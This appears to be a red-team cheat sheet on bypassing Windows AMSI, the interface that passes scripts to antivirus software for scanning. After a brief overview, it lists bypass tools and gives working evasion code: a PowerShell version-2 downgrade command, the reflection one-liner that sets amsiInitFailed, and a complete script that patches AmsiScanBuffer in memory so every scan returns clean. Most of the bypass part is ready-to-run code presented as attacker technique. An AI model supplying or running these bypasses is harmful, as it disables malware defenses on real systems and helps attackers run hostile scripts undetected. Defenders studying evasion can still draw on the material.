# Anti-Malware Scan Interface

## Overview

Anti-Malware Scan Interface (AMSI) is an API that allows applications and services (like PowerShell, Windows Script Host, or Office macros) to send potentially suspicious scripts or code to installed antivirus/antimalware solutions for scanning before execution.

## Automating AMSI Bypasses
[AMSI.fail](https://amsi.fail/) - generates obfuscated, randomly selected from a small pool PowerShell snippets that break or disable AMSI.
[AMSITrigger v3](https://github.com/RythmStick/AMSITrigger) allows attackers to automatically identify strings that are flagging signatures to modify and break them. Example:
```
AmsiTrigger_x64.exe -i test_bypass.ps1 -f 3
```


## AMSI Bypasses
### PowerShell Downgrade
`PowerShell Downgrade` is when an attacker launches `PowerShell v2` (or otherwise forces an older runspace) to dodge modern defenses like AMSI and Script Block Logging, which are built into v5+.
```
PowerShell -Version 2
```


### PowerShell Reflection
Reflection allows a user or administrator to access and interact with .NET assemblies.

```
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

### Patching AMSI
Patching AMSI allows attacker  to alter AMSI DLL (like `amsi.dll`) or overwrite functions (such as `AmsiScanBuffer`) in memory so that scans always succeed (i.e., return clean) — bypassing detection.

AMSI patching can be broken up into four steps,
1. Obtain handle of amsi.dll
2. Get process address of `AmsiScanBuffer`
3. Modify memory protections of `AmsiScanBuffer`
4. Write opcodes to `AmsiScanBuffer`

```powershell
$MethodDefinition = "

    [DllImport(`"kernel32`")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport(`"kernel32`")]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport(`"kernel32`")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
";

$Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name 'Kernel32' -NameSpace 'Win32' -PassThru;
$handle = [Win32.Kernel32]::GetModuleHandle('amsi.dll');
[IntPtr]$BufferAddress = [Win32.Kernel32]::GetProcAddress($handle, 'AmsiScanBuffer');
[UInt32]$Size = 0x5;
[UInt32]$ProtectFlag = 0x40;
[UInt32]$OldProtectFlag = 0;
[Win32.Kernel32]::VirtualProtect($BufferAddress, $Size, $ProtectFlag, [Ref]$OldProtectFlag);
$buf = [Byte[]]([UInt32]0xB8,[UInt32]0x57, [UInt32]0x00, [Uint32]0x07, [Uint32]0x80, [Uint32]0xC3);

[system.runtime.interopservices.marshal]::copy($buf, 0, $BufferAddress, 6);
```
